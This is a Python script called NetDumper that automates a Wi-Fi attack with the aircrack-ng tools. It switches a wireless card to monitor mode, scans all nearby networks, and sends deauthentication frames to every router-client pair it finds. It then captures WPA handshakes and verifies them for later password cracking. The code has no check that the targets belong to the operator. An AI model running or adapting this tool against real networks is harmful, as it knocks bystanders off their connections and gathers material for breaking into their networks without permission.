#!/usr/bin/env python3
import os
import sys
import time
import subprocess
import shutil
import re
import logging

LOCAL_DIR = os.path.dirname(os.path.abspath(__file__))

GREEN = "\033[92m"
RED = "\033[91m"
PINK = "\033[35m"
CYAN = "\033[96m"
RESET = "\033[0m"

logging.basicConfig(
    level=logging.INFO,
    format='\033[0m%(asctime)s - [%(levelname)s] - %(message)s',
    handlers=[
        logging.FileHandler(os.path.join(LOCAL_DIR, "netdumper.log")),
        logging.StreamHandler()
    ]
)

MAC_REGEX = re.compile(r"([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})")

def is_termux():
	return "com.termux" in os.environ.get("PREFIX", "")

def run_command(command):
    if isinstance(command, str):
        command = command.strip()

    try:
        result = subprocess.run(
            command,
            shell=True,
            check=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            timeout=None,
        )
        return result.stdout

    except subprocess.TimeoutExpired as te:
        return te.stdout if te.stdout else ""

    except subprocess.CalledProcessError as e:
        logging.error(f"{RED}Error: {command}\nStderr: {e.stderr}{RESET}")
        raise e

def package_installer():
    logging.info(f"{PINK}Installing Packages:")

    packages = {
        "iw": "iw",
        "aircrack-ng": "aircrack-ng",
        "ifconfig": "net-tools",
        "iwconfig": "wireless-tools"
    }

    missing_packages = []

    for binary, package in packages.items():
        found = shutil.which(binary)
        if found is None:
            logging.warning(f"{RED}Binary '{binary}' Not Found.")
            missing_packages.append(package)
        else:
            logging.info(f"{CYAN}Binary '{binary}' Found In: {found}")

    if missing_packages:
        try:
            logging.info(f"{PINK}Installing Missing Packages: {missing_packages}")

            run_command("apt update")

            for package in missing_packages:
                run_command(f"apt install {package} -y")

            logging.info(f"{GREEN}All Packages Were Installed Successfully.")

        except Exception as e:
            logging.error(f"{RED}Package Installation Failed: {e}")
            sys.exit(1)
    else:
        logging.info(f"{GREEN}All Packages Are Already Present In The System.")

def mapping_interfaces():
    logging.info(f"{CYAN}Locating And Categorizing Wireless Network Interface Cards...")

    interfaces_info = {
        "managed": None,
        "monitor": None
    }

    try:
        iw_output = run_command("iw dev")

        current_interface = None

        for ln in iw_output.split('\n'):

            if ln.strip().startswith("Interface"):
                current_interface = ln.split()[1]

            if ln.strip().startswith("type") and current_interface:
                iface_type = ln.split()[1]

                if iface_type == "managed" and not interfaces_info["managed"]:
                    interfaces_info["managed"] = current_interface
                elif iface_type == "monitor" and not interfaces_info["monitor"]:
                    interfaces_info["monitor"] = current_interface

        run_command("ifconfig")

        logging.info(
            f"{PINK}Interfaces Identified -> Managed: {RESET}"
            f"{CYAN}{interfaces_info['managed']} | {RESET}"
            f"{PINK}Monitor: {RESET}{CYAN}{interfaces_info['monitor']}"
        )

        return interfaces_info

    except Exception as e:
        logging.error(f"{RED}Error Mapping Network Interfaces: {e}")
        return interfaces_info

def format_row(content, shift_left=4, total_width=68):
    content_clean = re.sub(r'\x1b\[[0-9;]*m', '', content)
    left_padding = " " * shift_left
    available_space = total_width - shift_left - len(content_clean)
    right_padding = " " * max(0, available_space)
    return f"{GREEN}#{RESET}{left_padding}{content}{right_padding}{GREEN}#{RESET}"

def start(interfaces):
    managed_wnic = interfaces["managed"]
    monitor_wnic = interfaces["monitor"]

    try:
        if not monitor_wnic:
            logging.info(f"{PINK}Starting Monitor-Mode In Card: {RESET}{CYAN}{managed_wnic}...")
            run_command(f"airmon-ng start {managed_wnic}")
            interfaces = mapping_interfaces()
            monitor_wnic = interfaces["monitor"]
            if not monitor_wnic:
                raise Exception(
                    f"{RED}Monitor interface could not be detected "
                    "After Enabling Monitor Mode."
                )
        else:
            logging.info(f"{PINK}Card: {RESET}{CYAN}{monitor_wnic}{RESET}{PINK} Already In Monitor-Mode")

        logging.info(f"{PINK}Enabling The Interface: {RESET}{CYAN}{monitor_wnic}...")
        run_command(f"ifconfig {monitor_wnic} up")

        logging.info(f"{PINK}Checking If The Monitor Interface Is Active...")
        ifconfig_check = run_command("ifconfig")
        if monitor_wnic not in ifconfig_check:
            raise Exception(
                f"The: {monitor_wnic} Interface Was Not "
                f"Found To Be Active On The System."
            )

        logging.info(
            f"{PINK}Starting Temporary Scan With airodump-ng "
            f"On The Board: {RESET}{CYAN}{monitor_wnic}..."
        )

        cap_prefix = os.path.join(LOCAL_DIR, "airodump")

        try:
            subprocess.run(
                f"airodump-ng --output-format csv -w {cap_prefix} {monitor_wnic}",
                shell=True,
                timeout=60,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
        except subprocess.TimeoutExpired:
            pass

        time.sleep(1)
        csv_file = f"{cap_prefix}-01.csv"

        if os.path.exists(csv_file):
            master_csv = os.path.join(LOCAL_DIR, "airodump.csv")

            with open(csv_file, "r", encoding="utf-8", errors="ignore") as f:
                raw_new_lines = [
                    line.rstrip()
                    for line in f
                    if line.strip()
                ]

            existing_pairs = set()
            existing_lines = set()

            def extract_pair(line):
                parts = [p.strip() for p in line.split(",")]

                if len(parts) < 2:
                    return None

                if (len(parts) >= 6 and MAC_REGEX.match(parts[0]) and MAC_REGEX.match(parts[5])):
                    station_mac = parts[0].upper()
                    bssid = parts[5].upper()
                    return (bssid, station_mac)

                if (len(parts) >= 4 and MAC_REGEX.match(parts[0])):
                    bssid = parts[0].upper()
                    return (bssid, "")
                return None

            if os.path.exists(master_csv):
                with open(master_csv, "r", encoding="utf-8", errors="ignore") as f:
                    for line in f:
                        clean_line = line.strip()

                        if not clean_line:
                            continue

                        existing_lines.add(clean_line)

                        pair = extract_pair(clean_line)

                        if pair:
                            existing_pairs.add(pair)

            unique_lines = []

            for line in raw_new_lines:
                clean_line = line.strip()

                if clean_line in ["", ",", ",,", ",,,"]:
                    continue

                if ("BSSID" in clean_line or "Station MAC" in clean_line):
                    if clean_line not in existing_lines:
                        existing_lines.add(clean_line)
                        unique_lines.append(clean_line)
                    continue

                pair = extract_pair(clean_line)

                if pair:
                    if pair not in existing_pairs:
                        existing_pairs.add(pair)
                        unique_lines.append(clean_line)

                    continue

                if clean_line not in existing_lines:
                    existing_lines.add(clean_line)
                    unique_lines.append(clean_line)

            if unique_lines:
                with open(master_csv, "a", encoding="utf-8") as f:
                    for line in unique_lines:
                        f.write(line + "\n")

                logging.info(
                    f"{GREEN}Added "
                    f"{CYAN}{len(unique_lines)}{RESET}"
                    f"{GREEN} New Unique Lines."
                )
            else:
                logging.info(
                    f"{PINK}No New Unique Data Was Found."
                )
        else:
            logging.warning(
                f"{PINK}No Data Was Captured By airodump-ng, "
                "Or The File Was Not Generated."
            )

            return

        for file_name in os.listdir(LOCAL_DIR):
            if (file_name.startswith("airodump-") and file_name.endswith(".csv")):
                try:
                    os.remove(os.path.join(LOCAL_DIR, file_name))
                    logging.info(
                        f"{PINK}Temporary File Removed:{RESET} "
                        f"{CYAN}{file_name}"
                    )
                except Exception as cleanup_error:
                    logging.warning(
                        f"{RED}Could Not Remove Temporary File "
                        f"{file_name}: {cleanup_error}"
        )

        logging.info(
            f"{PINK}Parsing 'airodump.csv' To Identify Targets BSSID And Clients..."
        )

        targets = []

        with open(
            os.path.join(LOCAL_DIR, "airodump.csv"),
            "r",
            encoding="utf-8",
            errors="ignore"
        ) as f:
            lns = f.readlines()

        reading_clients = False
        channels_routers = {}
        for ln in lns:
            parts = [p.strip() for p in ln.split(',')]
            if len(parts) < 2:
                continue
            if "Station MAC" in parts[0] or "Station" in parts[0]:
                reading_clients = True
                continue
            if "BSSID" in parts[0]:
                continue
            if not reading_clients and len(parts) >= 4 and MAC_REGEX.match(parts[0]):
                bssid = parts[0]
                channel = parts[3]
                if channel.isdigit():
                    channels_routers[bssid] = channel
            if (reading_clients and len(parts) >= 6 and MAC_REGEX.match(parts[0]) and MAC_REGEX.match(parts[5])):
                mac_client = parts[0]
                mac_router = parts[5]
                if MAC_REGEX.match(mac_client) and mac_router in channels_routers:
                    targets.append({
                        "mac_router": mac_router,
                        "mac_client": mac_client,
                        "channel": channels_routers[mac_router]
                    })

        if not targets:
            logging.warning(f"{RED}No Active Router <-> Client Pair Was Found For Deauthentication.")
            return

        logging.info(f"{GREEN}Found{RESET} {CYAN}{len(targets)}{RESET} {GREEN}Targets For Deauth.")

        for idx, target in enumerate(targets):
            mac_rot = target["mac_router"]
            mac_cli = target["mac_client"]
            channel = target["channel"]

            logging.info(
                f"{PINK}Processing Target{RESET}{CYAN} {idx} {RESET}"
                f"{PINK}[Router:{RESET} {CYAN}{mac_rot}{RESET}{PINK} | Client: {RESET}{CYAN}{mac_cli}{RESET}{PINK} | Channel:{RESET}{CYAN} {channel}]"
            )

            logging.info(
                f"{PINK}Deauthenticating ->{RESET} {CYAN}aireplay-ng -0 1 -a {mac_rot} -c {mac_cli} {monitor_wnic}"
            )

            run_command(
                f"aireplay-ng -0 1 -a {mac_rot} -c {mac_cli} {monitor_wnic}"
            )

            cap_file = os.path.join(LOCAL_DIR, f"802.11{idx}")
            logging.info(
                f"{PINK}Starting Dynamic Capture for Handshake: {RESET}{CYAN}{cap_file}.cap on Channel {channel}..."
            )

            cmd_capture = (
                f"airodump-ng --bssid {mac_rot} --channel {channel} "
                f"-w {cap_file} {monitor_wnic}"
            )

            proc_capture = subprocess.Popen(
                cmd_capture,
                shell=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )

            handshake_captured = False
            max_wait_attempts = 60
            attempt = 0

            file_to_check = f"{cap_file}-01.cap"

            while attempt < max_wait_attempts:
                time.sleep(1)
                attempt += 1

                if os.path.exists(file_to_check):
                    check_cmd = f"aircrack-ng -b {mac_rot} {file_to_check}"
                    check_result = subprocess.run(
                        check_cmd,
                        shell=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        text=True
                    )

                    if "1 handshake" in check_result.stdout:
                        logging.info(f"{GREEN}[SUCCESS] 4-Way Handshake captured for BSSID {RESET}{CYAN}{mac_rot}!")
                        handshake_captured = True
                        break

            proc_capture.terminate()
            try:
                proc_capture.wait(timeout=2)
            except subprocess.TimeoutExpired:
                proc_capture.kill()

            if handshake_captured:
                logging.info(f"{GREEN}Packet Capture {RESET}{CYAN}{cap_file}{RESET}{GREEN} Completed dynamically via EAPOL filter verification.")
            else:
                logging.warning(f"{RED}Capture hit timeout limit without confirming a valid handshake for BSSID {RESET}{CYAN}{mac_rot}")

    except Exception as e:
        logging.error(f"{RED}A Critical Failure Occurred During The Execution Of The Flow: {e}")

    finally:
        logging.info(f"{GREEN}Interrupting Monitor Mode And Restoring Wi-Fi Network...")
        try:
            if monitor_wnic:
                run_command(f"airmon-ng stop {monitor_wnic}")

            if not is_termux():
                run_command("systemctl restart NetworkManager")
                run_command("nmcli radio wifi on")
            else:
                run_command("am start -a android.net.wifi.PICK_WIFI_NETWORK")

            logging.info(f"{GREEN}Network Interfaces Restored And NetworkManager Restarted Successfully.")

        except Exception as cleanup_error:
            logging.error(f"{RED}Error while trying to restore default network services: {cleanup_error}")

if __name__ == "__main__":

    print(f"{GREEN}#{RESET} {CYAN}{'='*22} WELCOME TO NETDUMPER {'='*22}{RESET} {GREEN}#{RESET}")
    print(format_row(" ", shift_left=0))
    print(format_row("=> Required Packages:"))
    print(format_row(" ", shift_left=0))
    print(format_row(f"{RED}iw{RESET}{GREEN}->{RESET} {CYAN}iw{RESET}"))
    print(format_row(f"{RED}aircrack-ng{RESET}{GREEN}->{RESET} {CYAN}aircrack-ng{RESET}"))
    print(format_row(f"{RED}ifconfig{RESET}{GREEN}->{RESET} {CYAN}net-tools{RESET}"))
    print(format_row(f"{RED}iwconfig{RESET}{GREEN}->{RESET} {CYAN}wireless-tools{RESET}"))
    print(format_row(" ", shift_left=0))
    print(format_row(f"{CYAN}{'-'*66}{RESET}", shift_left=1))
    print(format_row(" ", shift_left=0))
    print(format_row("=> Requirements:"))
    print(format_row(" ", shift_left=0))
    print(format_row(f"{RED}[*]{RESET} Wireless Network Interface Card (WNIC)."))
    print(format_row(f"{RED}[*]{RESET} The WNIC Chipset/Driver Must Support Monitor Mode."))
    print(format_row(f"{RED}[*]{RESET} Root Superuser Permissions."))
    print(format_row(" ", shift_left=0))
    print(format_row(f"{CYAN}{'*'*66}{RESET}", shift_left=1))
    print(format_row(" ", shift_left=0))
    print(format_row(f"{RED}SuperUser Mode:{RESET}"))
    print(format_row(f"{CYAN}~$ ./myuser su{RESET}"))
    print(format_row(" ", shift_left=0))
    print(format_row(f"{CYAN}{'*'*66}{RESET}", shift_left=1))
    print(format_row(f"CREATED BY: {GREEN}LUCAS LEBLANC{RESET}", shift_left=22))
    print(format_row(f"{CYAN}{'='*66}{RESET}", shift_left=1))

    if os.getuid() != 0:
        print(f"{RED}[ERROR] Root Authority Is Required.")
        sys.exit(1)

    if is_termux():
        PATH = "/data/data/com.termux/files/usr/bin"
        if PATH not in os.environ["PATH"]:
            os.environ["PATH"] = f"{PATH}:{os.environ['PATH']}"
    else:
        PATH = "/sbin:/usr/sbin:/usr/local/sbin"
        if PATH not in os.environ["PATH"]:
            os.environ["PATH"] = f"{os.environ['PATH']}:{PATH}"
        package_installer()

    mapped_interfaces = mapping_interfaces()

    start(mapped_interfaces)
	
    if os.path.exists(os.path.join(LOCAL_DIR, "airodump.csv")):
        run_command("python3 macextractor.py")
